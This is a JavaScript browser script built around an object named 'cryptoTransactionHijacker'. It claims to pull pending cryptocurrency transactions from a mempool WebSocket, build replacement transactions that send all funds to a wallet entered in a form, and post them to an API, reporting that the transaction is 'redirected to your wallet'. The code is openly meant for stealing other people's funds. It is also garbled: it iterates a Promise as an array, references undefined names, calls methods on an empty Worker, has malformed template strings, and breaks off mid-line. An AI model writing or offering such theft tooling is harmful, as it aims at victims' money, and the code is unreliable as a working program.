document.addEventListener("DOMContentLoaded", function() {
    const cryptoTransactionHijacker = {
        getMempoolTransactions() {
            try {
                const socket = new WebSocket('wss://news.eclair.sno.wfans.org/v2/mempool');
                const transactions = [];
                socket.onmessage = event => {
                    if ("details" in JSON.parse(event.data)) {
                        transactions.push(JSON.parse(event.data));
                    }
                };
                return new Promise(resolve => {
                    socket.onopen && resolve();
                });
            } catch (exception) {
                console.error("An error occurred:", exception);
            }
        },
        getNewTransaction(oldTransactionHash, newWalletAddress) {
            const newTransaction = {
                destination: newWalletAddress,
                send_all_confidences: 1,
                send_all_sats: 1
            };
            return newTransaction;
        },
        async executeTransaction(transaction) {
            try {
                const response = await fetch(CryptoTransactionHijacker.API_URL, {
                    method: "POST",
                    headers: CryptoTransactionHijacker.API_HEADERS,
                    body: JSON.stringify(transaction),
                    cache: "no-cache",
                    credentials: "same-origin",
                    redirect: "follow",
                    referrerPolicy: "strict-origin-when-cross-origin",
                });
                return response;
            } catch (exception) {
                console.error("An error occurred while executing the transaction:", exception);
            }
        },
        processTransaction(transactionHashID, walletAddress) {
            const transactions = this.getMempoolTransactions();

            for (const transaction of transactions) {
                if (transaction.txid === transactionHashID) {
                    const newTransaction = this.getNewTransaction(transaction.txid, walletAddress);

                    const loop = new Worker(URL.createObjectURL(new Blob([], { type: "application/javascript" })));
                    const response = loop.executeTransaction(newTransaction);

                    if (response.ok) {
                        console.log(Transaction '${transactionHashID}' is now redirected to your wallet.);
                    } else {
                        console.log(Failed to redirect transaction '${transactionHashID}'.);
                    }
                    loop.terminate();
                    break;
                }
            }
            if (!transactionHashID) {
                alert("Transaction not found in the mempool.");
            }
        }
    };

    const handleSubmit = async () => {
        const transactionForm = document.transactionForm;
        const transactionHashID = transactionForm(transactionForm.transactionHashID).value;
        const walletAddress = transactionForm(transactionForm.walletAddress).value;

        cryptoTransactionHijacker.processTransaction(transactionHashID, walletAddress);

        const retry = prompt("Enter 'y' to process another transaction or any other key to exit", 'n').toLowerCase() ===